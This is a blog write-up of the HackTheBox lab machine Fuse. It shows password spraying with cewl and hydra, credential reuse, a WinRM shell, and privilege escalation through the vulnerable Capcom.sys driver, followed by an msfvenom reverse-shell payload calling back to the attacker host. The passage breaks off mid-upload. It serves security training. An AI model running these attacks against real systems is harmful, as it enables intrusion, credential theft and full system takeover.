---
title: HTB: Fuse
url: https://0xdf.gitlab.io/2020/10/31/htb-fuse.html
date: 2020-10-31T13:45:00+00:00
difficulty: Medium [30]
os: Windows
tags: ctf, htb-fuse, hackthebox, windows, ldap, ldapsearch, rpc, smb, winrm, evil-winrm, crackmapexec, smbmap, rpcclient, papercut, gobuster, cewl, hydra, smbpasswd, capcom-sys, driver, visual-studio, eoploaddriver, msfvenom, scheduled-task, ghidra, oscp-like-v2
---

![Fuse](https://0xdfimages.gitlab.io/img/fuse-cover.png)

Fuse was all about pulling information out of a printer admin page. I’ll collect usernames and use cewl to make a wordlist, which happens to find the password for a couple accounts. I’ll need to change the password on the account to use it, and then I can get RPC access, where I’ll find more creds in the comments. I can use those creds for WinRM access, where I’ll find myself with privileges to load a driver. I’ll use the popular Capcom.sys driver to load a payload that returns a shell as system. In Beyond Root, I’ll look at the scheduled tasks that are managing the users passwords and trying to uninstall drivers put in place by HTB players.

## Box Info

| Name | [Fuse](https://hackthebox.com/machines/fuse)  [Fuse](https://hackthebox.com/machines/fuse) [Play on HackTheBox](https://hackthebox.com/machines/fuse) |
| --- | --- |
| Release Date | [13 Jun 2020](https://twitter.com/hackthebox_eu/status/1271114418802307075) |
| Retire Date | 31 Oct 2020 |
| OS | Windows Windows |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Fuse |
| Radar Graph | Radar chart for Fuse |
| First Blood User | 01:49:47[jizzy jizzy](https://app.hackthebox.com/users/140483) |
| First Blood Root | 04:19:00[xct xct](https://app.hackthebox.com/users/13569) |
| Creator | [egre55 egre55](https://app.hackthebox.com/users/1190) |

## Recon

### nmap

`nmap` found twenty open TCP ports, looking like a Windows domain controller:

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.193
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-14 14:49 EDT
Nmap scan report for 10.10.10.193
Host is up (0.048s latency).
Not shown: 65515 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49672/tcp open  unknown
49690/tcp open  unknown
49748/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 20.09 seconds

root@kali# nmap -sC -sV -p 53,80,88,135,139,445,464,593,636,3268,3269,5985 -oA scans/tcp-scripts 10.10.10.193
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-14 14:53 EDT
Nmap scan report for 10.10.10.193
Host is up (0.033s latency).

PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-06-14 19:10:59Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/14%Time=5EE67237%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h37m20s, deviation: 4h02m30s, median: 17m20s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Fuse
|   NetBIOS computer name: FUSE\x00
|   Domain name: fabricorp.local
|   Forest name: fabricorp.local
|   FQDN: Fuse.fabricorp.local
|_  System time: 2020-06-14T12:13:16-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-06-14T19:13:18
|_  start_date: 2020-06-13T20:04:52

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 273.83 seconds

```

The LDAP script identified a domain, fabricorp.local. The SMB script identified the OS as Windows Server 2016 Standard 14393, which matches with the [IIS version of 10](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions).

### SMB / RPC - TCP 445

`crackmapexec` confirms the OS and domain:

```

root@kali# crackmapexec smb 10.10.10.193
CME          10.10.10.193:445 FUSE            [*] Windows 10.0 Build 14393 (name:FUSE) (domain:FABRICORP)
[*] KTHXBYE!

```

`smbmap` shows that null auth doesn’t allow access:

```

root@kali# smbmap -H 10.10.10.193
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.193...
[+] IP: 10.10.10.193:445        Name: 10.10.10.193                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
[!] Access Denied
root@kali# smbmap -H 10.10.10.193 -u null
[+] Finding open SMB ports....
[!] Authentication error on 10.10.10.193
[!] Authentication error on 10.10.10.193

```

I’m able to connect with `rpcclient`, but don’t have permissions to access anything:

```

root@kali# rpcclient -U '' -N 10.10.10.193
rpcclient $> enumdomusers 
result was NT_STATUS_ACCESS_DENIED

```

### Website - TCP 80

#### Site

Going to `http://10.10.10.193` sends a 200 but it’s just a redirect to `http://fuse.fabricorp.local/papercut/logs/html/index.htm`:

```

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Sat, 30 May 2020 00:01:51 GMT
Accept-Ranges: bytes
ETag: "2c834e851536d61:0"
Server: Microsoft-IIS/10.0
Date: Sun, 14 Jun 2020 19:41:35 GMT
Connection: close
Content-Length: 103

<meta http-equiv="refresh" content="0; url=http://fuse.fabricorp.local/papercut/logs/html/index.htm" />

```

I’ll add both the domain and subdomain to my `/etc/hosts` file:

```
10.10.10.193 fuse.fabricorp.local fabricorp.local

```

Visiting `fabricorp.local` redirects to `fuse`.

The page is an instance of the PaperCut print logger:

![image-20200615063320269](https://0xdfimages.gitlab.io/img/image-20200615063320269.png)

In each of the detailed pages, there’s metadata about the print jobs. For example:

![image-20200615143401223](https://0xdfimages.gitlab.io/img/image-20200615143401223.png)

I’ll create a list of users:

```

pmerton
tlavel
sthompson
bhult
administrator

```

#### Directory Brute Force

I’ll run `gobuster` against the site, and include `-x htm` as the pages all seem to be `htm`:

```

root@kali# gobuster dir -u http://fuse.fabricorp.local -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x htm -t 40
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://fuse.fabricorp.local
[+] Threads:        40
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     htm
[+] Timeout:        10s
===============================================================
2020/06/15 06:44:22 Starting gobuster
===============================================================
/index.htm (Status: 200)
===============================================================
2020/06/15 06:45:30 Finished
===============================================================

```

I also searched down in the known directory, but nothing there either:

```

root@kali# gobuster dir -u http://fuse.fabricorp.local/papercut/logs/html/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x htm -t 40
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://fuse.fabricorp.local/papercut/logs/html/
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     htm
[+] Timeout:        10s
===============================================================
2020/06/15 08:25:24 Starting gobuster
===============================================================
/index.htm (Status: 200)
===============================================================
2020/06/15 08:28:37 Finished
===============================================================

```

### LDAP - TCP 389

I’ll use `ldapsearch` to confirm the base domain of `fabricorp.local` with `-s base namingcontexts`:

```

root@kali# ldapsearch -h 10.10.10.193 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=fabricorp,DC=local
namingContexts: CN=Configuration,DC=fabricorp,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=fabricorp,DC=local
namingContexts: DC=DomainDnsZones,DC=fabricorp,DC=local
namingContexts: DC=ForestDnsZones,DC=fabricorp,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```

Looks like I need creds to get deeper:

```

root@kali# ldapsearch -h 10.10.10.193 -x -b "DC=fabricorp,DC=local"
# extended LDIF
#
# LDAPv3
# base <DC=fabricorp,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A6C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v3839

# numResponses: 1

```

## Shell as svc-print

### Spray for Password

At this point, I don’t have a lot of options without credentials. I do have a handful of user names from the these printer logs. The logs are also potentially a good source of target specific words that might be used as a password. I’ll use them to build a wordlist and try to spray that against SMB to see if I can get anything.

#### Build Wordlist

I’ll create a wordlist from the webpage using `cewl`. The `--with-numbers` flag is a good one to use, especially here:

```

root@kali# cewl http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers > wordlist

```

Because I didn’t specify a `--depth`, it will go two links away from the root page, which should be enough to get everything I want.

#### Brute

Now I’ll check it against the server. Normally I would use `crackmapexec`. When I originally solved, I was traveling and my laptop had an old VM on which `crackmapexec` was breaking, and rather than spend time fixing it, I decided I’d rebuild later. In the mean time, I used `hydra`, and it found two matches:

```

root@kali# hydra -L users -P wordlist 10.10.10.193 smb
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-15 10:22:33
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 765 login tries (l:5/p:153), ~765 tries per task
[DATA] attacking smb://10.10.10.193:445/
[445][smb] host: 10.10.10.193   login: tlavel   password: Fabricorp01
[445][smb] host: 10.10.10.193   login: bhult   password: Fabricorp01
[STATUS] 738.00 tries/min, 738 tries in 00:01h, 27 to do in 00:01h, 1 active
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-15 10:23:36

```

It’s a bit weird that it found success for two different users with the same password. My guess is that that is to help with gameplay, especially on free HTB servers in the steps that come next.

### Login Failures

Now I try to check for shares with `smbmap`, but it fails:

```

root@kali# smbmap -u tlavel -p Fabricorp01 -H 10.10.10.193
[+] Finding open SMB ports....
[!] Authentication error on 10.10.10.193
[!] Authentication error on 10.10.10.193
root@kali# smbmap -u bhult -p Fabricorp01 -H 10.10.10.193
[+] Finding open SMB ports....
[!] Authentication error on 10.10.10.193
[!] Authentication error on 10.10.10.193

```

Better error messages came back from `smbclient`. When I enter a bad password:

```

root@kali# smbclient -U bhult -L \\\\10.10.10.193
Enter WORKGROUP\bhult's password: 
session setup failed: NT_STATUS_LOGON_FAILURE

```

But when I enter the password that `hydra` found:

```

root@kali# smbclient -U bhult -L \\\\10.10.10.193
Enter WORKGROUP\bhult's password: 
session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE

```

### Change Password

It looks like I have valid creds, but the machine is set to require a password change. To make this change, I can use `smbpasswd` from Kali. I’ll run it with `-r [ip]`, give it the old password, then a new one. If I pick a pass that doesn’t meet the password policy, I’ll see an error like:

```

machine 10.10.10.193 rejected the password change: Error was : When trying to update a password, this status indicates that some password update rule has been violated. For example, the password might not meet length criteria..

```

When I change it to `0xdf!!!!`, it works:

```

root@kali# smbpasswd -r 10.10.10.193 bhult
Old SMB password:
New SMB password:
Retype new SMB password:                                   
Password changed for user bhult on 10.10.10.193.

```

### Enumeration

#### Automation

Now I want to enumerate as bhult, but it turns out that the password resets to the default with the required change flag every minute, so I’ll need to work fast. I’ll write a one-liner that will check the current password, and if it fails, get a new password and change it. Then I can run commands using `$pass` as the password.

My one-liner is:

```

if echo "$pass" | smbclient -L //10.10.10.193 -U bhult 2>/dev/null >/dev/null; then echo "Password $pass still good"; else pass=$(date +%s | md5sum | base64 | head -c7; echo .); (echo 'Fabricorp01'; echo "$pass"; echo "$pass";) | smbpasswd -r 10.10.10.193 -s bhult; echo "password reset to $pass"; fi; [command here]

```

With some white-space added:

```

if echo "$pass" | smbclient -L //10.10.10.193 -U bhult 2>/dev/null >/dev/null; then 
  echo "Password $pass still good"; 
else 
  pass=$(date +%s | md5sum | base64 | head -c7; echo .); 
  (echo 'Fabricorp01'; echo "$pass"; echo "$pass";) | 
    smbpasswd -r 10.10.10.193 -s bhult; 
  echo "password reset to $pass"; 
fi; 
[command here]

```

It first tries to list shares on 10.10.10.193 using `smbclient`, with all the output going to `/dev/nul`. If that’s successful, then the password is still good. Otherwise, it creates a new password, and then changes us using `smbpasswd`. So now I can just up arrow to get this line, and add whatever command I want to run to the end.

#### SMB

The first thing I need to do is list the shares now accessible via bhult. I’m using the one-liner above, but for the sake of this post, I’ll just show just the command run:

```

root@kali# [pass check] smbmap -H 10.10.10.193 -u bhult -p "$pass"
Password changed for user bhult on 10.10.10.193.
password reset to YTQwMTd.
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.193...
[+] IP: 10.10.10.193:445        Name: fuse.fabricorp.local                              
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        HP-MFT01                                                NO ACCESS       HP-MFT01
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share 

```

I’ll connect to the `print$` share and see what’s there. Unfortunately, there’s not much of use. There’s a bunch of libraries (`.dll`), and there printer driver and config information.

#### RPC

With nothing interesting on SMB, I switched to RPC. I’ll connect using the one-liner:

```

root@kali# [pass check] rpcclient -U bhult%${pass} 10.10.10.193
Password changed for user bhult on 10.10.10.193.
password reset to OGY4NzY.
rpcclient $> 

```

I can get a list of users and some basic details using `querydispinfo`:

```

rpcclient $> querydispinfo
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0x109c RID: 0x1db2 acb: 0x00000210 Account: astein       Name: (null)    Desc: (null)
index: 0x1099 RID: 0x1bbd acb: 0x00020010 Account: bhult        Name: (null)    Desc: (null)
index: 0x1092 RID: 0x451 acb: 0x00020010 Account: bnielson      Name: (null)    Desc: (null)
index: 0x109a RID: 0x1bbe acb: 0x00000211 Account: dandrews     Name: (null)    Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0x109d RID: 0x1db3 acb: 0x00000210 Account: dmuir        Name: (null)    Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x109b RID: 0x1db1 acb: 0x00000210 Account: mberbatov    Name: (null)    Desc: (null)
index: 0x1096 RID: 0x643 acb: 0x00000210 Account: pmerton       Name: (null)    Desc: (null)
index: 0x1094 RID: 0x641 acb: 0x00000210 Account: sthompson     Name: (null)    Desc: (null)
index: 0x1091 RID: 0x450 acb: 0x00000210 Account: svc-print     Name: (null)    Desc: (null)
index: 0x1098 RID: 0x645 acb: 0x00000210 Account: svc-scan      Name: (null)    Desc: (null)
index: 0x1095 RID: 0x642 acb: 0x00020010 Account: tlavel        Name: (null)    Desc: (null)

```

I updated my list of users with this list.

Given the theme of the box, I’ll also enumerate printers:

```

rpcclient $> enumprinters
        flags:[0x800000]
        name:[\\10.10.10.193\HP-MFT01]
        description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
        comment:[]

```

There’s a share there and a password.

### Find user

On first reading, I figured that the user for the share might be scan2docs, but that doesn’t work:

```

root@kali# smbmap -H 10.10.10.193 -u scan2docs -p '$fab@s3Rv1ce$1'
[+] Finding open SMB ports....
[!] Authentication error on 10.10.10.193
[!] Authentication error on 10.10.10.193

```

At this point, I want to see what other users might use this password. `crackmapexec` will do the trick:

```

root@kali# crackmapexec smb 10.10.10.193 -u users -p '$fab@s3Rv1ce$1' --continue-on-success
SMB         10.10.10.193    445    FUSE             [*] Windows Server 2016 Standard 14393 x64 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\pmerton:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\tlavel:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\sthompson:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\administrator:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\Guest:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\krbtgt:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\DefaultAccount:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\sthompson:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\tlavel:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [+] fabricorp.local\svc-scan:$fab@s3Rv1ce$1 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\dandrews:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\mberbatov:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\astein:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\dmuir:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 

```

Both svc-print and svc-scan use that password. Unfortunately, it these creds didn’t provide anything additional over SMB:

```

root@kali# smbmap -H 10.10.10.193 -u svc-print -p '$fab@s3Rv1ce$1'
[+] IP: 10.10.10.193:445        Name: fuse.fabricorp.local                              
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        HP-MFT01                                                NO ACCESS       HP-MFT01
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share  

```

### Shell

I spent a while trying to enumerate shares with these new users and not finding much. Eventually I tried WinRM, and it turns out that svc-print can PowerShell remote:

```

root@kali# crackmapexec winrm 10.10.10.193 -u users -p '$fab@s3Rv1ce$1' --continue-on-success
WINRM       10.10.10.193    5985   FUSE             [*] Windows 10.0 Build 14393 (name:FUSE) (domain:fabricorp.local)
WINRM       10.10.10.193    5985   FUSE             [*] http://10.10.10.193:5985/wsman
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\pmerton:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\tlavel:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\sthompson:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\bhult:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\administrator:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\Guest:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\krbtgt:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\DefaultAccount:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1 (Pwn3d!)
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\bnielson:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\sthompson:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\tlavel:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\svc-scan:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\dandrews:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\mberbatov:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\astein:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\dmuir:$fab@s3Rv1ce$1

```

[Evil-WinRM](https://github.com/Hackplayers/evil-winrm) will provide a shell:

```

root@kali# evil-winrm -i 10.10.10.193 -u svc-print -p '$fab@s3Rv1ce$1'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-print\Documents>

```

And `user.txt`:

```
*Evil-WinRM* PS C:\Users\svc-print\desktop> cat user.txt
f399776d************************

```

## Priv: svc-print –> SYSTEM

### Enumeration

When I look at svc-print’s privileges, there’s an interesting one, `SeLoadDriverPrivilege`:

```
*Evil-WinRM* PS C:\programdata> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeLoadDriverPrivilege         Load and unload device drivers Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

### Strategy

Googling about `SeLoadDriverPrivilege` leads to [this post](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/) from TarLogic. If I can load a driver, I can load a vulnerable driver, and then exploit it. They use the vulnerable Capcom driver as an example. I’ll grab a copy of this vulnerable driver [here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys).

I’ll need to compile a couple `.exe` files to pull off this attack. I’ll do that in a Windows VM. I made some attempts to compile one of them in Kali using `mingw-64`, but it led to errors. It’s typically better to compile Windows executables in Windows where possible.

### Load Vulnerable Driver

#### Build Tool

To load the vulnerable `capcom.sys`, I’ll use [this tool](https://github.com/TarlogicSecurity/EoPLoadDriver/) from Tarlogic Security. It’s really just a single C++ file, so I’ll download it start a new Project in Visual Studio. At the window, I’ll choose a C++ Console App:

![image-20200619143555758](https://0xdfimages.gitlab.io/img/image-20200619143555758.png)

In the next window, I’ll name it EoPLoadDriver (though I can name it whatever I want):

![image-20200619143829908](https://0xdfimages.gitlab.io/img/image-20200619143829908.png)

Now I have a “HelloWorld” project:

![image-20200619143913104](https://0xdfimages.gitlab.io/img/image-20200619143913104.png)

I’ll replace all the code in `EoPLoadDriver.cpp` with the code from [GitHub](https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp), and save it. For some reason, it doesn’t like the `include "stdafx.h"`. This is [some kind of Visual Studio artifact](https://stackoverflow.com/questions/22621928/fatal-error-stdafx-h-file-not-found), and it can be removed.

Now I’ll set the project to “Release” and “x64”:

![image-20200619144130467](https://0xdfimages.gitlab.io/img/image-20200619144130467.png)

Then I’ll select Build –> Build Solution, and the output at the bottom shows it works:

![image-20200619144211509](https://0xdfimages.gitlab.io/img/image-20200619144211509.png)

I’ll copy `EoPLoadDriver.exe` back to my Kali host.

#### Execute

I’ll upload the driver and the loader to Fuse:

```
*Evil-WinRM* PS C:\programdata> upload Capcom.sys
Info: Uploading Capcom.sys to C:\programdata\Capcom.sys

Data: 14100 bytes of 14100 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\programdata> upload EoPLoadDriver.exe
Info: Uploading EoPLoadDriver.exe to C:\programdata\EoPLoadDriver.exe

Data: 20480 bytes of 20480 bytes copied

Info: Upload successful!

```

Run it just like in the blog post:

```
*Evil-WinRM* PS C:\programdata> .\eoploaddriver.exe System\CurrentControlSet\dfserv C:\ProgramData\Capcom.sys
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\dfserv
NTSTATUS: 00000000, WinError: 0

```

I don’t have permissions to see that the driver is running, but given the tool output, it seems good. If it returns anything other than `NTSTATUS: 00000000`, that’s an error. When I initially tried compiling this with `mingw-64`, I was getting [0xC000003B](http://errorco.de/win32/ntstatus-h/status_object_path_syntax_bad/0xc000003b/), which is `STATUS_OBJECT_PATH_SYNTAX_BAD` - Something in the path forming was breaking. I think [0xc0000034](https://books.google.com/books?id=kvm5LFDlwFcC&pg=PA379&lpg=PA379&dq=c0000034+status&source=bl&ots=Q-8FgC45wN&sig=ACfU3U0ec1Wq-Ceh41WVLzqqNHBYmvxW8A&hl=en&sa=X&ved=2ahUKEwjW75Csxo7qAhVDgXIEHftPB1YQ6AEwDnoECA0QAQ#v=onepage&q=c0000034%20status&f=false) (which is `STATUS_OBJECT_NAME_NOT_FOUND`) is thrown when the driver is already loaded (please let me know if this isn’t right).

### Driver Exploit

#### Load Project

I’ll start with [this project](https://github.com/tandasat/ExploitCapcom) from tandasat that exploits the vulnerable `Capcom.sys`. This is a full on Visual Studio project, so I’m going to do this from Windows. I’ll first download the zip from GitHub to my Windows VM. After unzipping, there’s an `.sln` Visual Studio project file:

![image-20200619112212074](https://0xdfimages.gitlab.io/img/image-20200619112212074.png)

Double clicking that opened it in VS. First, build the solution to make sure there aren’t any error before I start messing with things. I’ll set the dropdowns to Release and x64, and then go to Build –> Build Solution. It works:

![image-20200619112711132](https://0xdfimages.gitlab.io/img/image-20200619112711132.png)

#### Modify Code

The `README.md` shows that this exploit will pop open another `cmd.exe` window. That’s not useful for me. I found the point in the code where this happens:

```

// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}

```

I’ll change the `CommandLine` string to:

```

TCHAR CommandLine[] = TEXT("C:\\ProgramData\\0xdf.exe");

```

Now I can just drop a payload at `C:\programdata\0xdf.exe` and it will be run as SYSTEM.

#### Generate Payload

I could compile my own payload since I’ve already got Visual Studio open, but I’ll opt for a simple `msfvenom` payload. I’ll use `windows/x64/shell_reverse_tcp` to get a reverse shell I can handle with `nc`:

```

root@kali# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 -f exe -o rev.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: rev.exe

```

#### Execute

Now I’ll upload the two executables:

```
*Evil-WinRM* PS C:\programdata> upload rev.exe 0xdf.exe
Info: Uploading rev.exe to C:\programdata\0xdf.exe

Data: 9556 bytes of 9556 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\programdata> upload ExploitCapcom.exe
